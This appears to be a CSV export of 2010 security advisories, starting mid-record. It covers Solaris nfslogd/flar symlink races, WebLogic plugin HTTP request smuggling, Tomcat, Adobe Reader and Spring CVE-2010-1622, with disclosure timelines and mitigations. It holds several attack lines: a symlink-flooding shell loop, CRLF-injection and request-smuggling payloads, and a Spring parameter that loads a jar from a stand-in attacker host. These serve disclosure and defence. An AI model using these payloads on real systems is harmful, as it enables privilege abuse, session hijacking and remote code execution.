Escape character is '^]'.
^]
telnet> quit
Connection to localhost closed.
$ cat /etc/important
/</Scope>/ {
n
i
<Folder TreeDisplay=""false"">
<Name>SUNWrmui Bootstrap Folder</Name>
<Description>This a temporary folder to workaround a bug. It
should be deleted during install. But if you do see it in the toolbox
editor, do NOT delete it.</Description>
<Icon>status_16.gif</Icon>
<LargeIcon>status_32.gif</LargeIcon>
</Folder>
}
SUNWrmui_reg.sh also uses /tmp/this_computer.$$ which can also be
exploited.
- ------
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQEVAwUBTEUMPmKGA6cQSpZSAQJXogf+PNSJwfSchgycCWHVpqknVm4KKJ1s/m0y
SWmbzxkoTuKR3hrW7cAPbUb2RHU92Ew587/uPIXhpUCaTrYImJUU9EYHoo132ZpL
KNEXQeqzMi2qaxQU6mkQBEA9Qc3VDh0kDcbDPjPJKShqb2k84CBq6ni39vb1zRlY
SVMldGCS5XflnjtINiwzdmnjNCVkMT4wtuFo3f2GhZaNKEOAKr2LVZT1KkYA6fmY
a6E5XFisQPBbVSPhN82ed7v73GTe5o09SDN3bHozV7x2ki4vxjCFau/hGG/NVNVD
NddIRtqVu8uodrI5hyt1gNXtTV9rT40GiAyOA1iuQHM7FmB8SXKI8w==
=8592
-----END PGP SIGNATURE-----"
14822,CVE-2010-2382: Solaris nfslogd unsafe use of temporary files,,CVE-2010-2382,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Below is the full disclosure information for CVE-2010-2383. It was
reported to security-alert sun com on 29 December, 2009 and assigned Sun
bug 6913655.
This vulnerability was addressed by Sun/Oracle in the July 2010 Critical
Patch Update
(http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujul2010.html).
- ------
This one is with nfslogd which allows an unprivileged
user to create/overwrite a file as root:
Don't Panic! # ls -dl /etc/oops
/etc/oops: No such file or directory
Don't Panic! # ls -dl /tmp/.nfslogd.pid
lrwxrwxrwx 1 nobody nobody 9 Dec 29 21:24 /tmp/.nfslogd.pid
- -> /etc/oops
Don't Panic! # id
uid=0(root) gid=0(root)
Don't Panic! # /usr/lib/nfs/nfslogd
Don't Panic! # ls -dl /etc/oops
- -rw------- 1 root root 4 Dec 29 21:25 /etc/oops
- ------
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQEVAwUBTEUK12KGA6cQSpZSAQKDmgf+Khyu8Mq5rk4wKHUGQm4NCZOvC75ilW2e
Nr9dw/YEEDIZZkaGHRRtPD9pBgnrdCbP/Pvt6wSYyr+JOLYCO1BGGFA36eenTgzI
lbpDuFDgpVO4+DPb5TslS1MYkLYYFh+S9l0zzdYGVvAbURabp35VW852O2SHY7Pg
ZsUjRUrbSMIPUcVq024CLtro2VCJPiZ9o691ChpNlkdCTdtS6PUCllwQazz/2UFO
Gf21llPnO7kkQP7zbjbTITx9cjx6hYOxKbfLtrupxjtnXHRIjts0ToFxUYnT5eWD
3I/1m8/VjnqQSIY7nytcIj+nZG1z7e/zhOmdE54wRcpQzONYngNcWA==
=ojGd
-----END PGP SIGNATURE-----"
14823,CVE-2010-2382: Solaris flar unsafe use of temporary files,,CVE-2010-2382,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Below is the full disclosure information for CVE-2010-2382. It was
reported to security-alert sun com on 23 December, 2009 and assigned Sun
bug 6912851.
This vulnerability was addressed by Sun/Oracle in the July 2010 Critical
Patch Update
(http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujul2010.html).
- ------
flar appears to use several hard-coded temporary paths with the process
id appended such as these (possibly more--I didn't do an exhaustive search):
/tmp/.flash_filter_one_.11534
/tmp/.flash_filter_two_.11534
/tmp/.flarcreate.hash.11534
As an unprivileged user, I was able to pre-create symlinks (for every
likely pid) to a file I didn't have write permission to like this:
$ x=0
$ while [ ""$x"" -le 30000 ];do
> ln -s /etc/important /tmp/.flash_filter_one_.$x
> x=$(expr ""$x"" + 1)
> done
Later, when root creates a flash archive with:
# flar create -n junk `pwd`/junk.flar
/etc/important is appended to.
- ------
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQEVAwUBTEUJoWKGA6cQSpZSAQInYAf/W9LWENhsVqmyItxRdr5brhXMoFmxfLe2
jeN8KHJQMlUofI4GImVKO7078dE2CKht7lERpx2F6euXazDy1nG6QenBeSsRo8Ga
4fqhRlKswL+yb092pVZWIuLgNd5S2aqscoFG1q9cvWeF4qXuqyxQCraoA6HumfLc
WLMy3bcHsCkTS3+vT4axLO6PaoQbe1d0U0i8RPgc9s7cx4gHO04bQ/bmJnLocdKG
8aUkeQKZpc2Uws5F8goGfC3RfR9WxQMcZMzLfyM3FhxhCPxOtS0YdNPGOwGCYUTr
GeRQJemYYWxlK/SLMR/1tKYFa9JHbH+Nep+DVhzcHN7+HFr2kDOQiw==
=gcPO
-----END PGP SIGNATURE-----"
14827,PoC for CVE-2010-1869 (ghostscript) and CVE-2010-1039 (rpc.pcnfsd),,CVE-2010-1869,"Dear List,
I'm writing in behalf of the Check Point Vulnerability Discovery Team to provide the PoC for two vulnerabilities released in the past month:
- CVE-2010-1869 (Ghostscript stack overflow):
o http://www.kernelhacking.com/rodrigo/exploits/gs_bsd.pl.txt  -> Working exploit against PCBSD, exploiting the vulnerability thru CUPS
o http://www.kernelhacking.com/rodrigo/exploits/gs_ps.pl.txt -> To create a .ps file just to trigger the vulnerability
- CVE-2010-1039 (rpc.pcnfsd format string):
o http://www.kernelhacking.com/rodrigo/exploits/pcnfsd.c -> RPC message to trigger the format string, already supporting RPC fragmentation
We are leading a big change in the way vendors report vulnerabilities, providing PoC code so customers and interested parties are able to test the fixes and
IPS systems.  We provide such PoC code to the public at least a month AFTER the release of the fix and immediately per request of interested parties.
Additionally, Check Point is committed to responsible disclosure procedures, allowing vendors ample time to respond, alert customers and time to apply the
fixes before release.
Best Regards,
Rodrigo.
--
Rodrigo Rubira Branco
Senior Security Researcher
Vulnerability Discovery Team (VDT)
Check Point Software Technologies"
14879,CVE-2010-2375: WebLogic Plugin HTTP Injection via Encoded URLs,,CVE-2010-2375,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
VSR Security Advisory
http://www.vsecurity.com/
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Advisory Name: WebLogic Plugin HTTP Injection via Encoded URLs
Release Date: 2010-07-13
Application: WebLogic Plugin
Versions: All known versions
Severity: High
Discovered by: Timothy D. Morgan < tmorgan (at) vsecurity {dot} com >
Contributors: George D. Gal < ggal {at} vsecurity (dot) com >
Vendor Status: Patch Released [4]
CVE Candidate: CVE-2010-2375
Reference: http://www.vsecurity.com/resources/advisory/20100713-1/
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Product Description
- -------------------
The product is best described by Oracle marketing literature in:
""Oracle WebLogic Server Enterprise Edition offers enterprises the ability to
consolidate their applications on a pool of shared servers for both high
efficiency and superior performance. No other application server has
the proven performance on industry benchmarks across the most varied
chip types and operating systems. Sophisticated High Availability
(HA) features built on clustered instances ensure uptime. Easy-to-use
yet substantial management tools keep systems going without hassle or
expense. By coalescing applications and services onto Oracle WebLogic
Server, IT is in position to react swiftly to change and help the
enterprise outperform the competition."" -- [1]
And:
""Oracle WebLogic Server Web Server Plugins provide load balancing
across WebLogic Server Clusters by acting as front-end proxies. While
WebLogic Server Web Server Plugins 1.0 are bundled with WebLogic
Server, these new WebLogic Server Web Server Plugins 1.1 are
downloadable separately outside of WebLogic Server and deliver
enhanced functionality and improved security."" -- [2]
Vulnerability Overview
- ----------------------
Over the last several years, VSR analysts had observed unusual behavior
in multiple WebLogic deployments when certain special characters were
URL encoded and appended to URLs. In late April, 2010 VSR began
researching this more in depth and found that the issue could allow for
HTTP header injection and HTTP request smuggling attacks.
Product Background
- ------------------
WebLogic application server is commonly deployed in a three-tier
architecture where the application server resides behind a public-facing
web server. Oracle provides proprietary web server plugin modules for
multiple web server software packages on various platforms in order to
allow these services to act as reverse proxies and in some cases, load
balancers for multiple middle-tier WebLogic application servers.
Vulnerability Overview
- ----------------------
The vulnerability stems from the web server plugin's processing of URLs
submitted by users. When a URL is received, it is URL decoded at some
point, but is not re-encoded prior to inclusion in requests to the
middle-tier WebLogic server. This allows for special characters, such
as new lines, to be injected into requests directed at application
servers.
For instance, if an attacker were to send the following simple request:
GET /logo.gif%20HTTP/1.1%0d%0aX-hdr:%20x HTTP/1.1
Host: vulnerable.example.com
Connection: close
The web server proxy module would instead send a request on to the
application server which looks more like:
GET /logo.gif HTTP/1.1
X-hdr: x HTTP/1.1
Host: vulnerable.example.com
Connection: close
This behavior allows for a wide variety of attacks, including trusted
header injection and HTTP request smuggling.
Attack Scenarios
- ----------------
In the simplest scenarios, an attacker could use this flaw to inject
malicious versions of headers which are considered trusted. In certain
situations, headers are added to requests by the web server proxy module
which may be used to make decisions about authentication or access
control.
For instance, the WL-Proxy-Client-IP header is added to requests to
indicate to the application server which IP address the client used. If
the application server uses this to enforce IP-based access control
restrictions, then clearly this injection vulnerability could be used to
bypass this restriction.
Another example would be the injection of a WL-Proxy-Client-Cert
header. This header is used in deployments where clients are provided
SSL/TLS client certificates for authentication. Since web servers would
typically terminate this encrypted communication, application servers
need a way of identifying the user who was authenticated. The
WL-Proxy-Client-Cert header is used to communicate this information between
the web server plugin and application servers. By injecting a false
version of this header, it would be possible to impersonate other users
and perhaps avoid presenting a client certificate at all.
More complex attacks are also possible by using request smuggling, where
a full secondary request is injected into the TCP stream sent to the
application server. This class of attacks was well described in [3],
but we will outline some of the interesting cases here.
Once an attacker completely controls a secondary request submitted
directly to the application server, it is clearly possible to access
URLs on the application server which may not be accessible externally.
Depending on the application server and web server configuration, this
could be used to bypass security controls implemented on the web
server.
In addition, by injecting secondary requests which are unseen by the web
server, this causes the pairings of requests and responses to lose
correct synchronization. When attacking web servers that are
configured using simple proxy pairings (for instance, under Apache HTTPD
with WebLogicHost and WebLogicPort settings), this does not appear to
create many avenues of attack since web server TCP connections appear to
be directly paired with TCP connections to the application server.
However, if a the web server plugin is configured in clustered mode, TCP
connections to the application servers are shared between different
clients. For this reason, it is possible to force other users to see
incorrect HTTP responses and to view other users' HTTP responses.
For instance, if an attacker submitted an HTTP request which looked like
the following:
GET /logo.gif%20HTTP/1.1%0d%0aHost:%20vulnerable.example.com%0d%0a%0d%0aGET%20/inject.gif HTTP/1.1
Host: vulnerable.example.com
Then the following two requests (approximately) would appear in the TCP
stream between the web server and application server:
GET /logo.gif HTTP/1.1
Host: vulnerable.example.com
GET /inject.gif HTTP/1.1
Host: vulnerable.example.com
The attacker would receive the response to the first request containing
the logo.gif image, but a second response would be generated by the
application server and returned to the web server. Since the web server
did not know two requests were submitted, it will not process this
response immediately. Instead, the next request which is received (and
is intended for the same application server) will be incorrectly paired
with the response containing the inject.gif image.
If, after this initial injection, a victim user were to submit a request
for a document containing sensitive information, they would instead
receive the inject.gif image and the response to their request would
remain queued up between the application server and the web server. At
this point, if an attacker were able to submit another request at just
the right time (before anyone else's requests to this application
server), then he would receive the response containing the sensitive
information. VSR has implemented a proof of concept script [5] which
exploits this condition and records responses intended for other users.
In variations of this scenario, an attacker could also pair the request
smuggling attack with cross-site scripting (XSS) or cross-site request
forgery attacks to make them more devastating. For instance, if a
reflected XSS flaw were identified in the targeted WebLogic application,
then instead of requesting ""/inject.gif"", an attacker could submit an
injected request which exploits the flaw. Later, when a user requests
any page, they would instead receive the malicious script. In effect,
this allows the attacker to turn a reflected XSS flaw into a powerful
persistent one.
Versions Affected
- -----------------
Testing was conducted on the Apache variants of web server plugin
modules distributed with WebLogic 9.2, and 10.3. Version 1.1 of the
plugin modules (distributed separately at [2]) were also tested and
found to be vulnerable. In previous testing, the flaw appeared to exist
in the Sun ONE web server versions of the plugin as well.
Oracle has indicated that WebLogic web server plugins shipped with
WebLogic 7.0 SP7, 8.1 SP6, 9.0, 9.1, 9.2 MP3, 10.0 MP2, 10.3.2, and
10.3.3 are affected by this issue for Apache, Sun and IIS web servers.
Vendor Response
- ---------------
The following timeline details Oracle's response to the reported issue:
2010-05-04 Oracle was provided a draft advisory.
2010-05-05 Oracle acknowledged the notice and subsequently confirmed the
vulnerability. Issue #17254767 assigned.
2010-06-16 Continued communication with Oracle; July CPU targeted for
release of fix.
2010-07-09 Oracle notified VSR that a patch would be included in the
July 13th CPU.
2010-07-13 Oracle CPU and VSR advisory released.
See also: Oracle's advisory [4]
Recommendation
- --------------
It is recommended that WebLogic Plugin users apply the Oracle July 2010
Critical Patch Update (CPU)[4] as soon as possible.
If this is not immediately possible, a partial work-around may be
achieved by blocking certain encoded special characters in requested
URLs. It is recommended that the following be blocked (in a
case-insensitive manner):
%0d
%0a
These characters must be blocked in URLs at the perimeter prior to
processing by the WebLogic plugin. The following Apache mod_security
rules can be used, in the top-level configuration context, to mitigate
this threat in most cases:
SecRule REQUEST_URI ""%0d"" ""phase:1,t:none,t:removeNulls,t:lowercase,deny,status:403""
SecRule REQUEST_URI ""%0a"" ""phase:1,t:none,t:removeNulls,t:lowercase,deny,status:403""
Note that in practice it may be difficult to fully mitigate this flaw
with URL filtering due to complexities introduced by various character
encodings, fragmentation attacks, and inconsistencies in HTTP processing
between platforms.
Common Vulnerabilities and Exposures (CVE) Information
- ------------------------------------------------------
The Common Vulnerabilities and Exposures (CVE) project has assigned
the number CVE-2010-2375 to this issue. This is a candidates for
inclusion in the CVE list (http://cve.mitre.org), which standardizes
names for security problems.
Acknowledgements
- ----------------
Thanks to George Gal for assistance in testing and to Oracle for its
cooperation throughout the disclosure process.
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
References:
1. http://www.oracle.com/appserver/docs/weblogic-suite-datasheet.pdf
2. http://www.oracle.com/technology/software/products/ias/htdocs/wls_plugins.html
3. http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf
4. http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujul2010.html
5. http://www.vsecurity.com/download/tools/WebLogicPlugin-HRS-PoC.sh
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
This advisory is distributed for educational purposes only with the sincere
hope that it will help promote public safety. This advisory comes with
absolutely NO WARRANTY; not even the implied warranty of merchantability or
fitness for a particular purpose. Virtual Security Research, LLC nor the author
accepts any liability for any direct, indirect, or consequential loss or damage
arising from use of, or reliance on, this information.
See the VSR disclosure policy for more information on our responsible disclosure
practices:
http://www.vsecurity.com/company/disclosure
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Copyright 2010 Virtual Security Research, LLC. All rights reserved.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.10 (GNU/Linux)
iD8DBQFMPOjAQ1RSUNR+T+gRAgTjAJ4ukCHndE4dtHpCXIyULJkM5jjO5ACeIfR6
6Qvm1cvwhENJp3m1PUTKunA=
=2Pzx
-----END PGP SIGNATURE-----"
14916,[SECURITY] CVE-2010-2227: Apache Tomcat Remote Denial Of Service and Information Disclosure Vulnerability,,CVE-2010-2227,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2010-2227: Apache Tomcat Remote Denial Of Service and Information
Disclosure Vulnerability
Severity: Important
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 5.5.0 to 5.5.29
Tomcat 6.0.0 to 6.0.27
Tomcat 7.0.0
Note: 7.0.0 is still beta.
Note: The unsupported Tomcat 3.x, 4.x and 5.0.x versions may also be
affected.
Description:
Several flaws in the handling of the 'Transfer-Encoding' header were
found that prevented the recycling of a buffer. A remote attacker could
trigger this flaw which would cause subsequent requests to fail and/or
information to leak between requests.
Mitigation:
- - Tomcat 5.5.x users should upgrade to 5.5.30 or apply this patch:
http://svn.apache.org/viewvc?view=revision&revision=959428
- - Tomcat 6.0.x users should upgrade to 6.0.28 or apply this patch:
http://svn.apache.org/viewvc?view=revision&revision=958977
- - Tomcat 7.0.x users should upgrade to 7.0.1 when released or apply this
patch:
http://svn.apache.org/viewvc?view=revision&revision=958911
- - All users may mitigate this flaw by running Tomcat behind a reverse
proxy (such as Apache httpd 2.2) that rejects invalid values for
Transfer-Encoding.
Credit:
This issue was discovered by Steve Jones
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html
The Apache Tomcat Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJMN07EAAoJEBDAHFovYFnn8U4P/2wJuP+JYoqeIpPJwK7stqfd
jKO01S999v9lnYpIfPXEaFgGXTedo7BYo4X+OTuR7OLiAR6DVa1PhVzDd4bzoeW3
sY9zbOiXEvM6Ps5eVPJuR9P4YVs8O6qeLA8UKWV28KIFX/N4hZ5KAAJTSdlP0DuB
2dLB8cWtldTJrYmLVXbG//1j4S/k/PfHU/+MpZRIs8GWUPOpCxrWyvg+rTQN2zWP
iKsUzEEfXyoeHJmD/KM7OTbxfmL0HsUgeHPUBi4A6zPZt6e8614MZcr9FuwK4BBt
+8lCrZhP9XgxbTqp2qMRtF49ObK2gWVav3o2uruaK6NDvGLrAjgvV+mCxKVx6yjl
i9kL1K8S1FIO2eqTdVrQulega2NatYJxyG2ofDsb92+6mio/vLYKBxtI4bworQli
Vf/EWmYCuueKrZzde6k+HWhy9cR8JFdws/EGZ5UUaMiVB5Rvk5jPHwBgJDUdnSqC
75HEQBTsowsVKLGuHSnIjkg4B0IiAT6COsOsTfXsUSUn8f95a40GTynE70xvL0Ii
17wr2aK3fC8z9XG3Grbx1s4KiIW41iPBDSh9I7WWSQ+hhq+VHsBKJoubQsWW4qVb
sRuMx6kHTRq1DqEiTtAQFdMiE1oyDNB1ro99j44LH4azJvi5hS5S5R5QOyt9PshE
x6KDdVdqZF3+d64YwjtE
=KHN9
-----END PGP SIGNATURE-----"
14977,"VUPEN Security Research - Adobe Acrobat and Reader ""pushstring"" Memory Corruption Vulnerability (CVE-2010-2201)",,CVE-2010-2201,"VUPEN Security Research - Adobe Acrobat and Reader ""pushstring"" Memory Corruption Vulnerability (CVE-2010-2201)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Adobe Acrobat and Reader are the global standards for electronic
document sharing. They are used to create, view, search, digitally
sign, verify, print, and collaborate on Adobe PDF files.""
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability in
Adobe Acrobat and Reader.
This vulnerability is caused by a memory corruption error when processing
the ""pushstring"" (bytecode 0x2C) or ""debugfile"" (bytecode 0xF1) operators
while parsing Flash content within a PDF document, which could be exploited
by attackers to execute arbitrary code by tricking a user into opening a
malicious PDF file.
III. AFFECTED PRODUCTS
---------------------------
Adobe Reader version 9.3.2 and prior
Adobe Acrobat version 9.3.2 and prior
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. SOLUTION
----------------
Upgrade to Adobe Acrobat and Reader version 9.3.3 or 8.2.3.
VI. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1636
http://www.adobe.com/support/security/bulletins/apsb10-15.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2201
IX. DISCLOSURE TIMELINE
-----------------------------
2010-03-10 - Vendor notified
2010-03-10 - Vendor response
2010-06-20 - Status update received
2010-06-29 - Coordinated public Disclosure"
14978,"VUPEN Security Research - Adobe Acrobat and Reader ""newfunction"" Memory Corruption Vulnerability (CVE-2010-2168)",,CVE-2010-2168,"VUPEN Security Research - Adobe Acrobat and Reader ""newfunction"" Memory Corruption Vulnerability (CVE-2010-2168)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Adobe Acrobat and Reader are the global standards for electronic
document sharing. They are used to create, view, search, digitally
sign, verify, print, and collaborate on Adobe PDF files.""
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability in
Adobe Acrobat and Reader.
This vulnerability is caused by a memory corruption error when processing
the ""newfunction"" operator (bytecode 0x44) while parsing Flash content within
a PDF document, which could be exploited by attackers to execute arbitrary
code by tricking a user into opening a malicious PDF file.
III. AFFECTED PRODUCTS
---------------------------
Adobe Reader version 9.3.2 and prior
Adobe Acrobat version 9.3.2 and prior
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. SOLUTION
----------------
Upgrade to Adobe Acrobat and Reader version 9.3.3 or 8.2.3.
VI. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1636
http://www.adobe.com/support/security/bulletins/apsb10-15.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2168
IX. DISCLOSURE TIMELINE
-----------------------------
2010-03-08 - Vendor notified
2010-03-08 - Vendor response
2010-06-20 - Status update received
2010-06-29 - Coordinated public Disclosure"
14979,"VUPEN Security Research - Adobe Acrobat and Reader ""newclass"" Memory Corruption Vulnerability (CVE-2010-1285)",,CVE-2010-1285,"VUPEN Security Research - Adobe Acrobat and Reader ""newclass"" Memory Corruption Vulnerability (CVE-2010-1285)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Adobe Acrobat and Reader are the global standards for electronic
document sharing. They are used to create, view, search, digitally
sign, verify, print, and collaborate on Adobe PDF files.""
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability in
Adobe Acrobat and Reader.
This vulnerability is caused by a memory corruption error when processing
the ""newclass"" operator (bytecode 0x58) while parsing Flash content within
a PDF document, which could be exploited by attackers to execute arbitrary
code by tricking a user into opening a malicious PDF file.
III. AFFECTED PRODUCTS
---------------------------
Adobe Reader version 9.3.2 and prior
Adobe Acrobat version 9.3.2 and prior
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. SOLUTION
----------------
Upgrade to Adobe Acrobat and Reader version 9.3.3 or 8.2.3.
VI. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1636
http://www.adobe.com/support/security/bulletins/apsb10-15.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1285
IX. DISCLOSURE TIMELINE
-----------------------------
2009-09-06 - Vendor notified
2009-09-06 - Vendor response
2010-03-08 - Status update received
2010-06-20 - Status update received
2010-06-29 - Coordinated public Disclosure"
14980,VUPEN Security Research - Adobe Acrobat and Reader #1023 Tag Buffer Overflow Vulnerability (CVE-2010-2212),,CVE-2010-2212,"VUPEN Security Research - Adobe Acrobat and Reader #1023 Tag Buffer Overflow Vulnerability (CVE-2010-2212)
http://www.vupen.com/english/research.php
I. BACKGROUND
---------------------
""Adobe Acrobat and Reader are the global standards for electronic
document sharing. They are used to create, view, search, digitally
sign, verify, print, and collaborate on Adobe PDF files.""
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability in
Adobe Acrobat and Reader.
The vulnerability is caused by a buffer overflow error when processing
the undocumented #1023 (3FFh) tag while parsing Flash content within a PDF
document, which could be exploited by attackers to execute arbitrary code
by tricking a user into opening a malicious PDF.
III. AFFECTED PRODUCTS
---------------------------
Adobe Reader version 9.3.2 and prior
Adobe Acrobat version 9.3.2 and prior
IV. Binary Analysis & Proof-of-concept
---------------------------------------
In-depth binary analysis of the vulnerability and a code execution exploit
are available through the VUPEN Binary Analysis & Exploits Service :
http://www.vupen.com/english/services/ba-index.php
V. SOLUTION
----------------
Upgrade to Adobe Acrobat and Reader version 9.3.3 or 8.2.3.
VI. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is a leading IT security research company providing vulnerability
management and security intelligence solutions which enable enterprises
and institutions to eliminate vulnerabilities before they can be exploited,
ensure security policy compliance and meaningfully measure and manage risks.
Governmental and federal agencies, and global enterprises in the financial
services, insurance, manufacturing and technology industries rely on VUPEN
to improve their security, prioritize resources, cut time and costs, and
stay ahead of the latest threats.
* VUPEN Vulnerability Notification Service (VNS) :
http://www.vupen.com/english/services/vns-index.php
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program for Govs (TPP) :
http://www.vupen.com/english/services/tpp-index.php
* VUPEN Web Application Security Scanner (WASS) :
http://www.vupen.com/english/services/wass-index.php
VIII. REFERENCES
----------------------
http://www.vupen.com/english/advisories/2010/1636
http://www.adobe.com/support/security/bulletins/apsb10-15.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2212
IX. DISCLOSURE TIMELINE
-----------------------------
2009-09-06 - Vendor notified
2009-09-06 - Vendor response
2010-03-08 - Status update received
2010-06-20 - Status update received
2010-06-29 - Coordinated public Disclosure"
15052,CVE-2010-1622: Spring Framework execution of arbitrary code,,CVE-2010-1622,"CVE-2010-1622: Spring Framework execution of arbitrary code
Severity: Critical
Vendor:
SpringSource, a division of VMware
Versions Affected:
3.0.0 to 3.0.2
2.5.0 to 2.5.6.SEC01 (community releases)
2.5.0 to 2.5.7 (subscription customers)
Earlier versions may also be affected
Description:
The Spring Framework provides a mechanism to use client provided data to update the properties of an object. This mechanism allows an attacker to modify the properties of the class loader used to load the object (via 'class.classloader'). This can lead to arbitrary command execution since, for example, an attacker can modify the URLs used by the class loader to point to locations controlled by the attacker.
Example:
This example is based on a Spring application running on Apache Tomcat.
1. Attacker creates attack.jar and makes it available via an HTTP URL. This jar has to contain following:
- META-INF/spring-form.tld - defining spring form tags and specifying that they are implemented as tag files and not classes;
- tag files in META-INF/tags/ containing tag definition (arbitrary Java code).
2. Attacker then submits HTTP request to a form controller with the following HTTP parameter: class.classLoader.URLs[0]=jar:http://attacker/attack.jar!/ At this point the zeroth element of the WebappClassLoader's repositoryURLs property will be overwritten with attacker's URL.
3. Later on, org.apache.jasper.compiler.TldLocationsCache.scanJars() will use WebappClassLoader's URLs to resolve tag libraries and all tag files specified in TLD will be resolved against attacker-controller jar (HTTP retrieval of the jar file is performed by the URL class).
Mitigation:
All users may mitigate this issue by upgrading to 3.0.3
Community users of 2.5.x and earlier may also mitigate this issue by upgrading 2.5.6.SEC02
